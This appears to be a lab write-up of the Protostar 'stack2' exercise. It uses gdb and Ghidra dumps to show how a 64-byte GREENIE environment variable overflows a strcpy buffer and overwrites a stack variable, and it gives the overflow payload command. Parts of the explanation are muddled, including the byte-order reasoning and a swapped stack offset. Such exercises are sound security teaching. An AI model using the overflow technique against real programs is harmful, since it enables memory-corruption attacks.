Firstly, run the app

 `GREENIE` is with value `AAAABBBBCCCC`

## Disassemble `main()` from gdb
```
(gdb) disassemble main
Dump of assembler code for function main:
0x08048494 <main+0>:	push   ebp
0x08048495 <main+1>:	mov    ebp,esp
0x08048497 <main+3>:	and    esp,0xfffffff0
0x0804849a <main+6>:	sub    esp,0x60
0x0804849d <main+9>:	mov    DWORD PTR [esp],0x80485e0 ; "GREENIE"
0x080484a4 <main+16>:	call   0x804837c <getenv@plt>
0x080484a9 <main+21>:	mov    DWORD PTR [esp+0x5c],eax
0x080484ad <main+25>:	cmp    DWORD PTR [esp+0x5c],0x0
0x080484b2 <main+30>:	jne    0x80484c8 <main+52>
0x080484b4 <main+32>:	mov    DWORD PTR [esp+0x4],0x80485e8 ; "please set the GREENIE environment variable\n"
0x080484bc <main+40>:	mov    DWORD PTR [esp],0x1
0x080484c3 <main+47>:	call   0x80483bc <errx@plt>
0x080484c8 <main+52>:	mov    DWORD PTR [esp+0x58],0x0
0x080484d0 <main+60>:	mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <main+64>:	mov    DWORD PTR [esp+0x4],eax
0x080484d8 <main+68>:	lea    eax,[esp+0x18]
0x080484dc <main+72>:	mov    DWORD PTR [esp],eax
0x080484df <main+75>:	call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:	mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:	cmp    eax,0xd0a0d0a
0x080484ed <main+89>:	jne    0x80484fd <main+105>
0x080484ef <main+91>:	mov    DWORD PTR [esp],0x8048618 ; "you have correctly modified the variable"
0x080484f6 <main+98>:	call   0x80483cc <puts@plt>
0x080484fb <main+103>:	jmp    0x8048512 <main+126>
0x080484fd <main+105>:	mov    edx,DWORD PTR [esp+0x58]
0x08048501 <main+109>:	mov    eax,0x8048641 ; "Try again, you got {some hexadecimal value}"
0x08048506 <main+114>:	mov    DWORD PTR [esp+0x4],edx
0x0804850a <main+118>:	mov    DWORD PTR [esp],eax
0x0804850d <main+121>:	call   0x80483ac <printf@plt>
---Type <return> to continue, or q <return> to quit---
0x08048512 <main+126>:	leave  
0x08048513 <main+127>:	ret    
End of assembler dump.
```


### `esp+0x58` 

`0x080484c8 <main+52>:	mov    DWORD PTR [esp+0x58],0x0` this moves `0x0` to `esp+0x58` which we will later use it again at: 

```
0x080484e4 <main+80>:	mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:	cmp    eax,0xd0a0d0a
```

It's nothing but compare it with constant value `0xd0a0d0a`


### `esp+0x5c` 

`esp+0x5c` is the `GREENIE` env variable


We are currently at `eip`:
```
0x80484d4 <main+64>:	mov    DWORD PTR [esp+0x4],eax
```

Here is the detail debug:
```
(gdb) x/wx $esp+0x5c
0xbffff77c:	0xbffff9fa
(gdb) x/wx 0xbffff9fa
0xbffff9fa:	0x41414141
(gdb) x/s 0xbffff9fa
0xbffff9fa:	 "AAAABBBBCCCC"
```


### `0x80484e4 <main+80>`
```
(gdb) 
eax            0xbffff738	-1073744072
ecx            0x0	0
edx            0xd	13
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff720	0xbffff720
ebp            0xbffff788	0xbffff788
esi            0x0	0
edi            0x0	0
eip            0x80484e4	0x80484e4 <main+80>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff720:	0xbffff738	0xbffff9fa	0xb7fff8f8	0xb7f0186e
0xbffff730:	0xb7fd7ff4	0xb7ec6165	0x41414141	0x42424242
0xbffff740:	0x43434343	0x08049700	0xbffff758	0x08048358
0xbffff750:	0xb7ff1040	0x08049748	0xbffff788	0x08048549
0xbffff760:	0xb7fd8304	0xb7fd7ff4	0x08048530	0xbffff788
0xbffff770:	0xb7ec6365	0xb7ff1040	0x00000000	0xbffff9fa
0x80484e4 <main+80>:	mov    eax,DWORD PTR [esp+0x58]
0x80484e8 <main+84>:	cmp    eax,0xd0a0d0a
```

we see that our `GREENIE` value displayed onto the stack, and the next instruction will compare the variable `esp+0x58` with constant `0xd0a0d0a`. It turns out we need to overflow our `GREENIE` in order to overwrite that `esp+0x58` which at address `0xbffff77c=0x00000000`. 

In above example input, our `GREENIE` buffer is not enough, we only allocate it with 12 bytes. So, we need to allocate (2*4) + (4*4)*3 + (2*4), thus 64 bytes. Let's try with full 64 arbitrary bytes first, later we will change the last four bytes with `0xd0a0d0a`


Input with `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ`
```
(gdb) 
eax            0xbffff708	-1073744120
ecx            0x0	0
edx            0x45	69
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff6f0	0xbffff6f0
ebp            0xbffff758	0xbffff758
esi            0x0	0
edi            0x0	0
eip            0x80484e4	0x80484e4 <main+80>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff6f0:	0xbffff708	0xbffff9c2	0xb7fff8f8	0xb7f0186e
0xbffff700:	0xb7fd7ff4	0xb7ec6165	0x41414141	0x42424242
0xbffff710:	0x43434343	0x44444444	0x45454545	0x46464646
0xbffff720:	0x47474747	0x48484848	0x49494949	0x4a4a4a4a
0xbffff730:	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e
0xbffff740:	0x4f4f4f4f	0x50505050	0x51515151	0xbffff900
0x80484e4 <main+80>:	mov    eax,DWORD PTR [esp+0x58]
0x80484e8 <main+84>:	cmp    eax,0xd0a0d0a
```
Now the `esp+0x5c` is overflowed and overwritten with `0x51515151`. Obviously in the next `cmp` instruction it will give us a false comparasion result because `0x51515151!=0xd0a0d0a`.

```
(gdb) 
eax            0x8048641	134514241
ecx            0x0	0
edx            0x51515151	1364283729
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff6f0	0xbffff6f0
ebp            0xbffff758	0xbffff758
esi            0x0	0
edi            0x0	0
eip            0x804850d	0x804850d <main+121>
eflags         0x200216	[ PF AF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff6f0:	0x08048641	0x51515151	0xb7fff8f8	0xb7f0186e
0xbffff700:	0xb7fd7ff4	0xb7ec6165	0x41414141	0x42424242
0xbffff710:	0x43434343	0x44444444	0x45454545	0x46464646
0xbffff720:	0x47474747	0x48484848	0x49494949	0x4a4a4a4a
0xbffff730:	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e
0xbffff740:	0x4f4f4f4f	0x50505050	0x51515151	0xbffff900
0x804850d <main+121>:	call   0x80483ac <printf@plt>
0x8048512 <main+126>:	leave  
0x0804850d	25	in stack2/stack2.c
(gdb) 
Try again, you got 0x51515151
eax            0x1e	30
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff6f0	0xbffff6f0
ebp            0xbffff758	0xbffff758
esi            0x0	0
edi            0x0	0
eip            0x8048512	0x8048512 <main+126>
eflags         0x200296	[ PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff6f0:	0x08048641	0x51515151	0xb7fff8f8	0xb7f0186e
0xbffff700:	0xb7fd7ff4	0xb7ec6165	0x41414141	0x42424242
0xbffff710:	0x43434343	0x44444444	0x45454545	0x46464646
0xbffff720:	0x47474747	0x48484848	0x49494949	0x4a4a4a4a
0xbffff730:	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e
0xbffff740:	0x4f4f4f4f	0x50505050	0x51515151	0xbffff900
0x8048512 <main+126>:	leave  
0x8048513 <main+127>:	ret    
```

Finally, now for the correct part. Note that we need to allocate the bytes not in the normal way like this: `$ export GREENIE="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP\x0a\x0d\x0a\x0d"`, but instead using python interpreter `$ export GREENIE=$(python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")')`. The former part will treat `\x0a\x0d\x0a\x0d` as literal string. Also because the binary is considered as little endian, the payload at the end must be reserved.

0x0d 0a 0d 0a

how about these
`0xd0 a0 d0 a` are the same `0xd0 a0 d0 a0`

- `\x0a` represents the least/right most bytes: `0x00 00 00 a`
- `\x0d` -> `0x00 00 d0 a`
- `\x0a` -> `0x00 a0 00 a`
- `\x0d` -> `0xd0 a0 d0 a`



## Dissassemble from ghidra
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined4        Stack[-0x14]:4 local_14                                XREF[3]:     080484a9(W), 
                                                                                                   080484ad(R), 
                                                                                                   080484d0(R)  
             undefined4        Stack[-0x18]:4 local_18                                XREF[3]:     080484c8(W), 
                                                                                                   080484e4(R), 
                                                                                                   080484fd(R)  
             undefined1        Stack[-0x58]:1 local_58                                XREF[1]:     080484d8(*)  
             undefined4        Stack[-0x6c]:4 local_6c                                XREF[3]:     080484b4(W), 
                                                                                                   080484d4(W), 
                                                                                                   08048506(W)  
             undefined4        Stack[-0x70]:4 local_70                                XREF[5]:     0804849d(*), 
                                                                                                   080484bc(*), 
                                                                                                   080484dc(*), 
                                                                                                   080484ef(*), 
                                                                                                   0804850a(*)  
                             main                                            XREF[2]:     Entry Point(*), 
                                                                                          _start:080483f7(*)  
        08048494 55              PUSH       EBP
        08048495 89 e5           MOV        EBP,ESP
        08048497 83 e4 f0        AND        ESP,0xfffffff0
        0804849a 83 ec 60        SUB        ESP,0x60
        0804849d c7 04 24        MOV        dword ptr [ESP]=>local_70,s_GREENIE_080485e0     = "GREENIE"
                 e0 85 04 08
        080484a4 e8 d3 fe        CALL       <EXTERNAL>::getenv                               char * getenv(char * __name)
                 ff ff
        080484a9 89 44 24 5c     MOV        dword ptr [ESP + local_14],EAX
        080484ad 83 7c 24        CMP        dword ptr [ESP + local_14],0x0
                 5c 00
        080484b2 75 14           JNZ        LAB_080484c8
        080484b4 c7 44 24        MOV        dword ptr [ESP + local_6c],s_please_set_the_GR   = "please set the GREENIE enviro
                 04 e8 85 
                 04 08
        080484bc c7 04 24        MOV        dword ptr [ESP]=>local_70,0x1
                 01 00 00 00
        080484c3 e8 f4 fe        CALL       <EXTERNAL>::errx                                 undefined errx()
                 ff ff
                             LAB_080484c8                                    XREF[1]:     080484b2(j)  
        080484c8 c7 44 24        MOV        dword ptr [ESP + local_18],0x0
                 58 00 00 
                 00 00
        080484d0 8b 44 24 5c     MOV        EAX,dword ptr [ESP + local_14]
        080484d4 89 44 24 04     MOV        dword ptr [ESP + local_6c],EAX
        080484d8 8d 44 24 18     LEA        EAX=>local_58,[ESP + 0x18]
        080484dc 89 04 24        MOV        dword ptr [ESP]=>local_70,EAX
        080484df e8 b8 fe        CALL       <EXTERNAL>::strcpy                               char * strcpy(char * __dest, cha
                 ff ff
        080484e4 8b 44 24 58     MOV        EAX,dword ptr [ESP + local_18]
        080484e8 3d 0a 0d        CMP        EAX,0xd0a0d0a
                 0a 0d
        080484ed 75 0e           JNZ        LAB_080484fd
        080484ef c7 04 24        MOV        dword ptr [ESP]=>local_70,s_you_have_correctly   = "you have correctly modified t
                 18 86 04 08
        080484f6 e8 d1 fe        CALL       <EXTERNAL>::puts                                 int puts(char * __s)
                 ff ff
        080484fb eb 15           JMP        LAB_08048512
                             LAB_080484fd                                    XREF[1]:     080484ed(j)  
        080484fd 8b 54 24 58     MOV        EDX,dword ptr [ESP + local_18]
        08048501 b8 41 86        MOV        EAX,s_Try_again,_you_got_0x%08x_08048641         = "Try again, you got 0x%08x\n"
                 04 08
        08048506 89 54 24 04     MOV        dword ptr [ESP + local_6c],EDX
        0804850a 89 04 24        MOV        dword ptr [ESP]=>local_70,EAX=>s_Try_again,_yo   = "Try again, you got 0x%08x\n"
        0804850d e8 9a fe        CALL       <EXTERNAL>::printf                               int printf(char * __format, ...)
                 ff ff
                             LAB_08048512                                    XREF[1]:     080484fb(j)  
        08048512 c9              LEAVE
        08048513 c3              RET

```